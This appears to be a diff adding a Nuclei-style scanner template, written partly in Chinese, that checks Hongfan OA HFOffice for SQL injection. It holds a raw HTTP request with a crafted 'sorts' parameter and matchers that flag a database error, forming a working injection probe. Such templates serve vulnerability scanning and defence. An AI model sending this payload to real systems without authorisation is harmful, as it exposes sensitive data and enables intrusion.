@@ -1,0 +1,27 @@
+id: hongfan-hfoffice-sql-injection
+
+info:
+  name: 红帆OA HFOffice SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    红帆OA HFOffice系统存在SQL注入漏洞，攻击者可通过构造恶意输入执行非授权的SQL查询，从而获取敏感数据。
+
+  tags: 红帆OA
+
+http:
+- raw:
+  - |
+    GET /api/switch-value/list?sorts=%5B%7B%22Field%22:%221-user%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c6c69905a7 HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [400]
+  - type: word
+    part: body
+    words:
+    - 'dbo'
